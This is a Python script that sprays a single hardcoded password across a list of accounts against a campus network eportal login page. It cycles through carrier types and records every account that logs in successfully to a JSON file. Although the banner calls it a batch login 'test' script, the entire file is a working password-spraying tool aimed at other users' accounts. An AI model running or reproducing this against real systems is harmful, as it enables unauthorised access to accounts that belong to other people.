# -*- coding: utf-8 -*-
import requests
import time
import socket
import os
import sys
import json

# --- Configuration ---
ACCOUNT_LIST_FILENAME = "six.txt"  # 包含账号列表的文件
OUTPUT_JSON_FILENAME = "successful.json"  # 输出JSON文件名

# Network and Login Configuration
LOGOUT_URL_TEMPLATE = "http://172.16.1.38:801/eportal/?c=ACSetting&a=Logout&loginMethod=1&protocol=http%3A&hostname=172.16.1.38&port=&iTermType={iTermType}&wlanuserip={local_ip}&wlanacip=172.20.1.1&wlanacname=huawei-me60&redirect=null&session=null&vlanid=null%3Cinput+type%3D&ip={local_ip}&queryACIP=0&jsVersion=2.4.3"
LOGIN_URL_TEMPLATE = "http://172.16.1.38:801/eportal/?c=ACSetting&a=Login&loginMethod=1&protocol=http%3A&hostname=172.16.1.38&port=&iTermType={iTermType}&wlanuserip={local_ip}&wlanacip=172.20.1.1&wlanacname=&redirect=null&session=null&vlanid=0&mac=00-00-00-00-00-00&ip={local_ip}&enAdvert=0&jsVersion=2.4.3&DDDDD=%2C0%2C{account}%40cmcc&upass={password}&R1=0&R2=0&R3=0&R6=0&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=&v6ip="
LOGIN_SUCCESS_TITLE = "认证成功页"
LOGOUT_SUCCESS_TEXT = "您已成功注销"
PASSWORD = "147258"
ITERM_TYPES = [1, 2, 3]

# Delays and Retries
REQUEST_TIMEOUT = 10
LOGOUT_REQUEST_TIMEOUT = 15
LOGOUT_RETRY_COUNT = 2
LOGOUT_RETRY_DELAY = 5
SUCCESS_LOGIN_PAUSE = 3
POST_LOGOUT_DELAY = 2
INTER_ITERMTYPE_DELAY = 1

# Action on persistent logout failure
LOGOUT_FAIL_ACTION = "continue_with_warning"
LOGOUT_FAIL_LONG_PAUSE_DURATION = 300

# Global variables
local_ip = None
all_accounts = []
successful_logins = []


# --- Helper Functions ---
def fix_cmd_encoding():
    if sys.platform == 'win32':
        os.system('chcp 65001 > nul')


def get_local_ip_address():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception as e:
        print(f"[警告] 自动获取IP失败: {e}")
        return None


def load_accounts_from_file(filename):
    accounts = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                account = line.strip()
                if account:
                    accounts.append(account)
        # This print moved to main after total_accounts_to_test is defined
        # print(f"[信息] 从 {filename} 加载了 {len(accounts)} 个账号。")
        if not accounts:
            print(f"[错误] 文件 {filename} 为空或未能读取到任何账号。程序将退出。")
            sys.exit(1)
        return accounts
    except FileNotFoundError:
        print(f"[错误] 账号文件 {filename} 未找到。程序将退出。")
        sys.exit(1)
    except Exception as e:
        print(f"[错误] 读取账号文件 {filename} 时发生错误: {e}。程序将退出。")
        sys.exit(1)


def initialize_successful_logins():
    global successful_logins
    try:
        if os.path.exists(OUTPUT_JSON_FILENAME) and os.path.getsize(OUTPUT_JSON_FILENAME) > 0:
            with open(OUTPUT_JSON_FILENAME, 'r', encoding='utf-8') as f:
                data = json.load(f)
                if isinstance(data, list):
                    successful_logins = data
                    print(f"[信息] 从 {OUTPUT_JSON_FILENAME} 加载了 {len(successful_logins)} 条已成功的记录。")
                else:
                    print(f"[警告] {OUTPUT_JSON_FILENAME} 内容格式不正确 (不是列表)，将重新开始记录。")
                    successful_logins = []
        else:
            successful_logins = []
    except FileNotFoundError:
        print(f"[信息] {OUTPUT_JSON_FILENAME} 未找到，将创建新文件记录成功登录。")
        successful_logins = []
    except json.JSONDecodeError:
        corrupt_file_path = OUTPUT_JSON_FILENAME + ".corrupt." + time.strftime("%Y%m%d-%H%M%S")
        print(f"[警告] {OUTPUT_JSON_FILENAME} 内容损坏或非JSON格式。")
        try:
            if os.path.exists(OUTPUT_JSON_FILENAME):
                os.rename(OUTPUT_JSON_FILENAME, corrupt_file_path)
                print(f"[信息] 已将损坏文件备份为: {corrupt_file_path}")
            else:
                print(f"[信息] 原始文件 {OUTPUT_JSON_FILENAME} 未找到，无需备份。")
        except Exception as backup_e:
            print(f"[错误] 备份损坏文件 {OUTPUT_JSON_FILENAME} 失败: {backup_e}")
        successful_logins = []
    except Exception as e:
        print(f"[错误] 初始化加载 {OUTPUT_JSON_FILENAME} 时发生未知错误: {e}。将重新开始记录。")
        successful_logins = []


def save_successful_logins_to_file():
    global successful_logins
    try:
        with open(OUTPUT_JSON_FILENAME, 'w', encoding='utf-8') as f:
            json.dump(successful_logins, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[错误] 实时保存结果到JSON文件 {OUTPUT_JSON_FILENAME} 时失败: {e}")


# --- Core Login/Logout Logic ---
def attempt_login(account, iTermType, current_ip, password_to_use):
    login_url = LOGIN_URL_TEMPLATE.format(account=account, iTermType=iTermType, local_ip=current_ip,
                                          password=password_to_use)
    try:
        response = requests.get(login_url, timeout=REQUEST_TIMEOUT)
        response.raise_for_status()
        if LOGIN_SUCCESS_TITLE in response.text:
            entry_exists = any(e['account'] == account and e['type'] == iTermType for e in successful_logins)
            if not entry_exists:
                successful_logins.append(
                    {"account": account, "type": iTermType, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")})
                return True, True
            else:
                return True, False
        else:
            return False, False
    except requests.exceptions.Timeout:
        return False, False
    except requests.exceptions.RequestException:
        return False, False
    except Exception:
        return False, False


def perform_logout(current_ip, logged_in_account=None, logged_in_iTermType=None):
    if not LOGOUT_URL_TEMPLATE:
        print("[警告] LOGOUT_URL_TEMPLATE 未配置，跳过下线操作。")
        return True
    if logged_in_iTermType is None:
        print("[警告] 执行下线操作需要 iTermType，但未提供。跳过下线。")
        return True

    logout_url = LOGOUT_URL_TEMPLATE.format(local_ip=current_ip, iTermType=logged_in_iTermType)

    for attempt in range(LOGOUT_RETRY_COUNT + 1):
        try:
            print(
                f"[信息] 发送下线请求 (尝试 {attempt + 1}/{LOGOUT_RETRY_COUNT + 1}) IP: {current_ip} (账号: {logged_in_account}, iTermType: {logged_in_iTermType})")
            response = requests.get(logout_url, timeout=LOGOUT_REQUEST_TIMEOUT)
            response.raise_for_status()
            print(f"[信息] 下线请求已处理 (服务器响应 {response.status_code}) (尝试 {attempt + 1})。")
            return True
        except requests.exceptions.Timeout:
            print(
                f"[错误] 下线请求超时 (尝试 {attempt + 1}/{LOGOUT_RETRY_COUNT + 1}) IP: {current_ip}, iTermType: {logged_in_iTermType}")
            if attempt < LOGOUT_RETRY_COUNT:
                print(f"[信息] {LOGOUT_RETRY_DELAY}秒后重试下线...")
                time.sleep(LOGOUT_RETRY_DELAY)
            else:
                print(f"[严重错误] 下线超时，已达最大重试次数。")
                return False
        except requests.exceptions.RequestException as e:
            print(f"[错误] 下线网络请求异常 (尝试 {attempt + 1}/{LOGOUT_RETRY_COUNT + 1}): {e}")
            if attempt < LOGOUT_RETRY_COUNT:
                print(f"[信息] {LOGOUT_RETRY_DELAY}秒后重试下线...")
                time.sleep(LOGOUT_RETRY_DELAY)
            else:
                print(f"[严重错误] 下线因网络异常失败，已达最大重试次数。")
                return False
        except Exception as e:
            print(f"[错误] 下线时发生未知错误 (尝试 {attempt + 1}/{LOGOUT_RETRY_COUNT + 1}): {e}")
            return False
    return False


# --- Main Program ---
if __name__ == "__main__":
    fix_cmd_encoding()
    initialize_successful_logins()

    print("=== 校园网批量登录测试脚本 (单线程实时保存V2版) ===")

    local_ip = get_local_ip_address()
    if not local_ip:
        local_ip_input = input("[输入] 自动获取IP失败，请输入本机IPv4地址: ").strip()
        if not local_ip_input:
            print("[错误] 未提供有效的IP地址。程序将退出。")
            sys.exit(1)
        local_ip = local_ip_input
    print(f"\n[信息] 当前使用的IP地址: {local_ip}")

    all_accounts = load_accounts_from_file(ACCOUNT_LIST_FILENAME)
    total_accounts_to_test = len(all_accounts)  # Definition added here
    print(f"[信息] 从 {ACCOUNT_LIST_FILENAME} 加载了 {total_accounts_to_test} 个账号。")  # Adjusted print statement

    print(f"[信息] 密码将使用硬编码值: '{PASSWORD}'")
    print(f"[信息] 运营商类型将尝试: {ITERM_TYPES}")
    print(f"[信息] 成功登录后将暂停 {SUCCESS_LOGIN_PAUSE} 秒再注销。")
    print(f"[信息] 成功结果将实时保存到: {OUTPUT_JSON_FILENAME}")
    if not LOGOUT_URL_TEMPLATE:
        print("[警告] LOGOUT_URL_TEMPLATE 未配置! 如果需要自动下线，请配置此项。")
    else:
        print(f"[信息] 下线URL模板已配置。")
    print(f"[信息] 下线失败处理策略: {LOGOUT_FAIL_ACTION}")
    if LOGOUT_FAIL_ACTION == "long_pause":
        print(f"[信息] 下线失败长时暂停时长: {LOGOUT_FAIL_LONG_PAUSE_DURATION}秒")

    input("\n按 Enter 开始执行测试...\n")
    start_time = time.time()
    processed_accounts_count = 0
    new_logins_this_session_count = 0

    for account_index, account in enumerate(all_accounts):
        processed_accounts_count += 1
        print(f"\n--- 测试账号: {account} ({processed_accounts_count}/{total_accounts_to_test}) ---")
        successfully_logged_in_this_cycle = False
        successful_iTermType_for_this_cycle = None

        for iterm in ITERM_TYPES:
            print(f"[尝试] 账号: {account} 使用 iTermType: {iterm}")
            web_success, new_entry_added = attempt_login(account, iterm, local_ip, PASSWORD)

            if web_success:
                print(f"[成功] 登录成功! 账号: {account}, 运营商类型(iTermType): {iterm}")
                successfully_logged_in_this_cycle = True
                successful_iTermType_for_this_cycle = iterm

                if new_entry_added:
                    new_logins_this_session_count += 1
                    print(f"[信息] 新的成功登录已记录到内存: {account}, iTermType: {iterm}")
                    save_successful_logins_to_file()
                    print(f"[信息] 当前 {len(successful_logins)} 条成功记录已保存到 {OUTPUT_JSON_FILENAME}。")
                else:
                    print(f"[信息] 账号 {account} (iTermType: {iterm}) 已存在于成功列表，未重复添加。")
                logout_successful = perform_logout(local_ip, account, successful_iTermType_for_this_cycle)

                if not logout_successful:
                    print(
                        f"[CRITICAL WARNING] 账号 {account} 下线操作最终失败。这很可能会影响后续所有账号的登录测试结果！")
                    if LOGOUT_FAIL_ACTION == "stop":
                        print("[信息] 根据配置，脚本因下线失败而终止。")
                        sys.exit(1)
                    elif LOGOUT_FAIL_ACTION == "long_pause":
                        print(f"[信息] 根据配置，将暂停 {LOGOUT_FAIL_LONG_PAUSE_DURATION} 秒，尝试让服务器会话超时...")
                        for i in range(LOGOUT_FAIL_LONG_PAUSE_DURATION, 0, -1):
                            print(f"\r   等待中... {i} 秒剩余   ", end="")
                            time.sleep(1)
                        print("\r长时间暂停结束，继续测试。            ")

                if POST_LOGOUT_DELAY > 0:
                    time.sleep(POST_LOGOUT_DELAY)
                break
            else:
                if INTER_ITERMTYPE_DELAY > 0:
                    time.sleep(INTER_ITERMTYPE_DELAY)

        if not successfully_logged_in_this_cycle:
            print(f"[信息] 账号: {account} 所有运营商类型均尝试失败。")

    end_time = time.time()
    print(f"\n[信息] 所有账号测试完毕。总耗时: {end_time - start_time:.2f} 秒。")
    print(f"[信息] 本次运行共通报 {new_logins_this_session_count} 个新的成功登录。")
    if successful_logins:
        print(
            f"\n[最终结果] {OUTPUT_JSON_FILENAME} 中共包含 {len(successful_logins)} 条成功登录的账号组合 (已实时保存)。")
    else:
        print("\n[最终结果] 未找到或记录任何可成功登录的账号组合。")
    print("\n脚本执行完毕。")